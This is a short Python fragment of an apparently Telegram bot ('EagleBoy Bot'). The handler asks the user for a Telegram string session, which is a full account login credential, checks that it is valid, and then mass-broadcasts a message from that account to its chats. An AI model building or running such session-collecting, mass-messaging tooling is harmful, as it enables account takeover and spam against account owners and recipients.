    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("Now Give Message")
        msg = await x.get_response()
        await gcast(strses.text, msg.text)
        await event.reply(
            "Done üòóüòó\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )
